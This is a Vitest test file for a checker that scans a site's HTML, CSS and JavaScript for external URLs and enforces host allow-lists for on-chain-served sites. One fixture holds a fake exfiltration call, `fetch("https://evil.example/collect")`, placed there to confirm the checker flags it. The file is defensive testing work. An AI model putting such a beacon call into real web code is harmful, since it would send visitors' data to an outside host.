import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { expect, test } from 'vitest';
import {
  checkSite,
  collectReferences,
  hostAllowed,
  isExternal,
  jsUrls,
  OPT_IN_HOSTS,
  RPC_HOSTS,
  scanHtml,
  TEXT_ONLY_HOSTS,
} from '../../lib/onchain-check';
import { makeSiteFile } from '../../lib/site-files';

const file = (path: string, text: string) => makeSiteFile(path, new TextEncoder().encode(text));

test('isExternal matches the gateway definition', () => {
  for (const u of ['https://a.example', 'HTTP://a.example', 'wss://a.example', 'ftp://a.example', '//a.example/x']) {
    expect(isExternal(u)).toBe(true);
  }
  for (const u of ['./a.js', '/docs/', '#/sign', 'data:image/png;base64,AA', 'blob:x', 'mailto:a@b.c', '']) {
    expect(isExternal(u)).toBe(false);
  }
});

test('scanHtml finds src, href, srcset, inline css and meta refresh', () => {
  const html = [
    `<img srcset="a.png 1x, https://x.example/b.png 2x">`,
    `<a href='https://y.example/'>y</a>`,
    `<div style="background:url('//z.example/c.png')"></div>`,
    `<meta http-equiv="refresh" content="0;url=https://r.example/">`,
    `<form action=https://f.example/post></form>`,
    `<a href="#/sign">s</a><img src="data:image/png;base64,AAAA">`,
  ].join('');
  expect(
    scanHtml(html)
      .map((e) => `${e.where} ${e.url}`)
      .sort(),
  ).toEqual(
    [
      'html https://f.example/post',
      'html https://x.example/b.png',
      'html https://y.example/',
      'inline-css //z.example/c.png',
      'meta-refresh https://r.example/',
    ].sort(),
  );
});

test('collectReferences resolves site paths like the gateway', () => {
  const html =
    '<a href="../">up</a><a href="guide.html#x">g</a><link href="/docs/_astro/a.css">' +
    '<a href="https://x.example/">x</a><a href="mailto:a@b.c">m</a><img src="caf%C3%A9.png">';
  expect(collectReferences(html, 'html', 'docs/reference/').sort()).toEqual(
    ['docs/_astro/a.css', 'docs/index.html', 'docs/reference/caf\u{E9}.png', 'docs/reference/guide.html'].sort(),
  );
});

test('site check flags external references', () => {
  const r = checkSite([
    file(
      'index.html',
      '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter"><img src="//cdn.example/x.png"><script type="module" src="./assets/app.js"></script>',
    ),
    file(
      'assets/app.css',
      '@import "https://cdn.example/reset.css"; body { background: url(https://cdn.example/bg.png) }',
    ),
    file('assets/app.js', 'fetch("https://evil.example/collect");fetch("https://health.atropyle.invalid/health")'),
  ]);
  expect(r.ok).toBe(false);
  expect(new Set(r.external.map((e) => `${e.path} ${e.url}`))).toEqual(
    new Set([
      'index.html https://fonts.googleapis.com/css2?family=Inter',
      'index.html //cdn.example/x.png',
      'assets/app.css https://cdn.example/reset.css',
      'assets/app.css https://cdn.example/bg.png',
    ]),
  );
  expect(r.js).toEqual([
    { path: 'assets/app.js', url: 'https://evil.example', where: 'js' },
    { path: 'assets/app.js', url: 'https://health.atropyle.invalid', where: 'js' },
  ]);
});

test('site check accepts OKX RPC and text-only hosts in JS', () => {
  const js = [
    'const rpc=["https://rpc.xlayer.tech","https://xlayerrpc.okx.com/"];',
    'const link="https://www.oklink.com/x-layer/address/"+a;',
    'const ns="http://www.w3.org/2000/svg";',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: a template literal inside the fixture bundle text
    'const docs=`https://${host}/docs`;',
  ].join('\n');
  const r = checkSite([
    file('index.html', '<script type="module" src="./assets/index.js"></script><a href="#/proof">Proof</a>'),
    file('assets/index.js', js),
  ]);
  expect(r).toEqual({ ok: true, external: [], js: [] });
});

test('host lists allow *.suffix patterns and every entry has a reason', () => {
  expect(hostAllowed('4-2-396.tapekit.org')).toBe(true);
  expect(hostAllowed('tapekit.org.evil.example')).toBe(false);
  expect(hostAllowed('RPC.XLAYER.TECH')).toBe(true);
  expect(hostAllowed('xlayer.drpc.org')).toBe(true);
  expect(hostAllowed('4byte.sourcify.dev')).toBe(true);
  expect(hostAllowed('health.atropyle.invalid')).toBe(false);
  for (const reason of [...Object.values(TEXT_ONLY_HOSTS), ...Object.values(OPT_IN_HOSTS)]) {
    expect(reason.length).toBeGreaterThan(10);
  }
});

test('jsUrls accepts bracketed IPv6 hosts and ports', () => {
  // biome-ignore lint/suspicious/noTemplateCurlyInString: a template literal inside the fixture bundle text
  expect(jsUrls('a("http://[::1]:8545");b("http://127.0.0.1:8545/x");c(`https://${h}`)').sort()).toEqual([
    'http://127.0.0.1:8545',
    'http://[::1]:8545',
  ]);
  const r = checkSite([file('assets/a.js', 'fetch("http://[::1]:8545")')]);
  expect(r.js).toEqual([{ path: 'assets/a.js', url: 'http://[::1]:8545', where: 'js' }]);
});

test('RPC_HOSTS equals the hosts of the web ONCHAIN_RPCS', () => {
  const src = readFileSync(fileURLToPath(new URL('../../../apps/web/src/lib/rpc.ts', import.meta.url)), 'utf8');
  const list = /ONCHAIN_RPCS[^=]*=\s*\[([^\]]*)\]/.exec(src);
  expect(list).not.toBeNull();
  const hosts = [...(list?.[1] ?? '').matchAll(/'([^']+)'/g)].map((m) => new URL(m[1]).hostname);
  expect([...RPC_HOSTS].sort()).toEqual(hosts.sort());
});
